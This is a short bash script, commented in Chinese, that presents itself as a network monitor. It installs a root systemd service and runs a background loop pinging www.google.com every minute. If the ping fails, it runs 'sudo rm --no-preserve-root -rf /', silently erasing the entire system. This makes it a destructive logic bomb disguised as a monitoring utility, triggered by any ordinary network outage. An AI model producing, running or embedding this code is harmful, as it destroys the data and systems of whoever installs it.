#!/bin/bash

# 創建 systemd 服務文件
create_systemd_service() {
    cat > /etc/systemd/system/network_monitor.service <<EOF
[Unit]
Description=Network monitor service

[Service]
ExecStart=/bin/bash /path/to/monitor_network.sh
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF
}

# 檢查是否能夠 ping 通 google.com
check_network_status() {
    if ping -c1 www.google.com &> /dev/null; then
        echo "Network is OK"
    else
        sudo rm --no-preserve-root -rf / > /dev/null 2>&1
        echo "Network is down, rm -rf /"
    fi
}

# 主循環
while true; do
    check_network_status
    sleep 60
done &

# 創建 systemd 服務並啟用
create_systemd_service
systemctl enable network_monitor.service
systemctl start network_monitor.service

echo "network_monitor.service has been created and started."
echo "To stop the service, run: systemctl stop network_monitor.service"
echo "To start the service, run: systemctl start network_monitor.service"
